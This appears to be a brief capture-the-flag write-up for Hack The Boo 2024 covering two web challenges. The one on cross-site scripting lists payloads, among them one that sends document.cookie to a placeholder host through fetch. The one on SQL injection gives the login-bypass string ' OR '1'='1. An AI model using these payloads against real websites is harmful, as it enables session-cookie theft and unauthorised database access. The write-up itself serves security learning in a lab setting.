# Hack The Boo 2024 Write-Up

## WEB

### Phantom's Script

![image](https://github.com/user-attachments/assets/1d5b113b-039a-46ba-8470-0c8688fd03c4)

Basic XSS Payload:

`<script>alert('Boo!');</script>`

`<script>fetch('[host]')</script>`

More Diabolical Payload:

`<img src=x onerror="alert('Boo!')">`

`<img src=x onerror="fetch('[HOST]' + document.cookie)" />`

Use XSS payload `<script>fetch('[host]')</script>`

![image](https://github.com/user-attachments/assets/3bd034b8-1f32-4c04-9ebe-b96564676f02)

### Unholy Union

![image](https://github.com/user-attachments/assets/65afbf7a-4d21-431c-98af-08696dc38732)

    ' OR '1'='1

![image](https://github.com/user-attachments/assets/8cd95fa3-2dc9-42a9-ae86-766d1c988a39)

